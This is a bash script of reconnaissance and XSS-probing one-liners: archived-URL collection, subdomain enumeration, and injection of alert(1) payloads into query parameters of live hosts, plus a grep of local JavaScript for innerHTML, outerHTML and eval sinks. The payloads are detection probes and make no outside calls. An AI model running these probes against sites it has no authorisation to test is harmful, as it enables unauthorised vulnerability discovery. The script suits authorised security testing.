#!/bin/bash
# XSS Vibes - Robust OneLiners with Fallbacks
# Generated with service availability check

# Wayback With Fallbacks

# Wayback with multiple fallbacks
waybackurls {target} 2>/dev/null || \
curl -s "https://arquivo.pt/wayback/cdx?url={target}/*" 2>/dev/null || \
echo "Using local URL list..." && cat saved_urls.txt 2>/dev/null || \
echo "All wayback services failed - using manual discovery"


# Subdomain Enum Robust

# Robust subdomain enumeration
subfinder -d {target} -silent 2>/dev/null || \
amass enum -passive -d {target} 2>/dev/null || \
(echo "API services down - using DNS bruteforce:" && \
 for sub in www api admin test dev staging; do \
   dig +short $sub.{target} | head -1; \
 done)


# Gau With Fallbacks

# GAU with fallbacks
gau {target} 2>/dev/null || \
waybackurls {target} 2>/dev/null || \
echo "Using manual URL discovery..."


# Xss Test Offline

# XSS testing without external dependencies
echo {target} | httpx -silent | while read url; do \
  for payload in "<script>alert(1)</script>" "javascript:alert(1)" "'><svg onload=alert(1)>"; do \
    curl -s "$url?test=$payload" | grep -q "alert(1)" && echo "XSS found: $url"; \
  done; \
done


# Local Js Analysis

# Local JavaScript analysis for XSS
find . -name "*.js" -exec grep -l "innerHTML\|outerHTML\|eval" {} \; | \
while read file; do \
  echo "Analyzing: $file"; \
  grep -n "innerHTML\|outerHTML\|eval" "$file"; \
done


